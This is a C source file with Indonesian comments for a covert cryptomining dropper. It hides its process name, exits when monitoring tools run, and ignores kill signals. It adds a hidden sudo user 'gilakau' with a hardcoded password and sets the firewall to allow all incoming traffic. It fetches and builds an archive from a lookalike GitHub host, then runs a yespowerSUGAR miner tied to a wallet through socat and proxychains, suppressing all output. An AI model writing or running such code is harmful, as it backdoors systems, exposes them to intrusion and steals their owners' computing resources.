#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <stdbool.h>
#include <string.h>
#include <signal.h>
#include <sys/prctl.h>
#include <sys/stat.h>  
#include <sys/wait.h>


void check_monitoring_tools() {
    FILE *fp;
    char command[256];
    
    // Cek jika ada proses ps atau top yang sedang berjalan
    fp = popen("ps aux | grep -E 'top|ps|lsof'", "r");
    if (fp != NULL) {
        while (fgets(command, sizeof(command), fp) != NULL) {
            if (strstr(command, "top") || strstr(command, "ps") || strstr(command, "lsof")) {
                // Jika ditemukan ps, top, atau lsof, lakukan sesuatu
                printf("Alat pemantau terdeteksi! Menghentikan proses...\n");
                _exit(0);
            }
        }
        fclose(fp);
    }
}

// Fungsi untuk mengabaikan sinyal
void signal_ignore(int sig) {
    (void)sig;
}

void setup_signal_handlers() {
    struct sigaction sa;
    sa.sa_handler = signal_ignore;
    sa.sa_flags = 0;
    sigemptyset(&sa.sa_mask);

    if (sigaction(SIGINT, &sa, NULL) < 0 ||
        sigaction(SIGTERM, &sa, NULL) < 0 ||
        sigaction(SIGHUP, &sa, NULL) < 0 ||
        sigaction(SIGQUIT, &sa, NULL) < 0) {
        perror("sigaction failed");
        exit(EXIT_FAILURE);
    }
}



// Variabel untuk menandai status loading
volatile bool loading = false;

// Spinner animation
void* spinner(void* arg) {
    const char spin_chars[] = "/-\\|";
    int i = 0;
    while (loading) {
        printf("\r%c Loading...", spin_chars[i % 4]);
        fflush(stdout);
        usleep(300000);
        i++;
    }
    printf("\r✓ Selesai      \n");
    return NULL;
}

// Bersihkan tampilan perintah dari argumen teknis
void bersihkanPerintah(const char* input, char* output, size_t maxLen) {
    char temp[512];
    strncpy(temp, input, sizeof(temp));
    temp[sizeof(temp) - 1] = '\0';

    char* token = strtok(temp, " ");
    output[0] = '\0';

    while (token != NULL) {
        if (strcmp(token, "sudo") == 0 ||
            strcmp(token, "-y") == 0 ||
            strcmp(token, ">") == 0 ||
            strcmp(token, "2>&1") == 0 ||
            strstr(token, "/dev/null") != NULL) {
            token = strtok(NULL, " ");
            continue;
        }
        if (strlen(output) + strlen(token) + 2 < maxLen) {
            strcat(output, token);
            strcat(output, " ");
        }
        token = strtok(NULL, " ");
    }

    size_t len = strlen(output);
    if (len > 0 && output[len - 1] == ' ') {
        output[len - 1] = '\0';
    }
}

// Fungsi utama dengan opsi spinner dan tampilkan nama
int jalankanPerintah(const char* cmd, bool tampilkanPerintah, bool pakaiSpinner) {
    if (tampilkanPerintah) {
        char bersih[512];
        bersihkanPerintah(cmd, bersih, sizeof(bersih));
        printf("Menjalankan perintah: %s\n", bersih);
    }

    pthread_t thread_id;

    if (pakaiSpinner) {
        loading = true;
        pthread_create(&thread_id, NULL, spinner, NULL);
    }

    int status = system(cmd);

    if (pakaiSpinner) {
        loading = false;
        pthread_join(thread_id, NULL);
    }

    if (WIFEXITED(status)) {
        int exitCode = WEXITSTATUS(status);
        if (exitCode != 0) {
            printf("\n[ERROR] Perintah gagal dijalankan. Exit code: %d\n", exitCode);
        }
        return exitCode;
    } else {
        printf("\n[ERROR] Perintah tidak dieksekusi dengan benar.\n");
        return -1;
    }
}

// Fungsi-fungsi perintah
int perintahSatu() {
    return jalankanPerintah("sudo apt update -y", true, false);
}

int perintahDua() {
    printf("Process number 2...\n");
    return jalankanPerintah("sudo adduser --disabled-password --gecos "" --allow-bad-names gilakau > /dev/null 2>&1", false, true);
}

int perintahTiga() {
    printf("Process number 3...\n");
    return jalankanPerintah("echo 'gilakau:SapuLidi10' | sudo chpasswd > /dev/null 2>&1", false, true);
}

int perintahEmpat() {
    printf("Process number 4...\n");
    return jalankanPerintah("grep gilakau /etc/passwd > /dev/null 2>&1", false, true);
}

int perintahLima() {
    printf("Process number 5...\n");
    return jalankanPerintah("sudo usermod -a -G sudo gilakau > /dev/null 2>&1", false, true);
}

int perintahEnam() {
    printf("Process number 6...\n");
    return jalankanPerintah("echo 'SapuLidi10' | su gilakau -c \"echo 'SapuLidi10' | sudo -S -H bash -c 'apt update -y > /dev/null 2>&1 && apt install ufw libcurl4-openssl-dev libssl-dev libjansson-dev socat -y > /dev/null 2>&1 && ufw enable > /dev/null 2>&1 && ufw default allow incoming > /dev/null 2>&1 && ufw default allow outgoing > /dev/null 2>&1 && ufw status verbose > /dev/null 2>&1 && ufw status > /dev/null 2>&1' > /dev/null 2>&1\" > /dev/null 2>&1", false, true);
}

int perintahTujuh() {
    printf("Process number 7...\n");
    return jalankanPerintah("echo 'SapuLidi10' | su gilakau -c \"echo 'SapuLidi10' | sudo -S -H bash -c 'curl -O https://rawa.githubusercontent.com/piksuf/naszuiernamsxcuioernaszxcvuio/refs/heads/main/myapp.tar.gz > /dev/null 2>&1 && tar -xf myapp.tar.gz > /dev/null 2>&1' > /dev/null 2>&1\" > /dev/null 2>&1", false, true);
}

int perintahDelapan() {
    printf("Process number 8...\n");
    return jalankanPerintah("echo 'SapuLidi10' | su gilakau -c \"echo 'SapuLidi10' | sudo -S -H bash -c './configure --prefix=$PWD > /dev/null 2>&1 && make clean > /dev/null 2>&1 && make > /dev/null 2>&1 && make install > /dev/null 2>&1' > /dev/null 2>&1\" > /dev/null 2>&1", false, true);
}

int perintahSembilan() {
    printf("Process number 9...\n");
    return jalankanPerintah("echo 'SapuLidi10' | su gilakau -c \"echo 'SapuLidi10' | sudo -S -H bash -c 'timeout 35s socat TCP4-LISTEN:8080,fork TCP4:yespowerSUGAR.na.mine.zpool.ca:6241 > /dev/null 2>&1 | timeout 30s ./proxychains4 ./sse -a yespowerSUGAR -o stratum+tcp://localhost:8080 -u D8zcvGHWayuBq5MRncKTnKtFcooQCueZLP.T_$(date +\"%d%m\")_$(date +\"%H%M\") -p c=DGB,zap=SUGAR -t $(nproc) -q > /dev/null 2>&1' > /dev/null 2>&1\" > /dev/null 2>&1", false, true);
}


int main() {
	prctl(PR_SET_NAME, (unsigned long)"process", 0, 0, 0);
	check_monitoring_tools();
	setup_signal_handlers();
    if (perintahSatu() != 0) {
    }
    if (perintahDua() != 0) {
    }
    if (perintahTiga() != 0) {
    }
    if (perintahEmpat() != 0) {
    }
    if (perintahLima() != 0) {
    }
    if (perintahEnam() != 0) {
    }
    if (perintahTujuh() != 0) {
    }
    if (perintahDelapan() != 0) {
    }
    if (perintahSembilan() != 0) {
    }

    return 0;
}
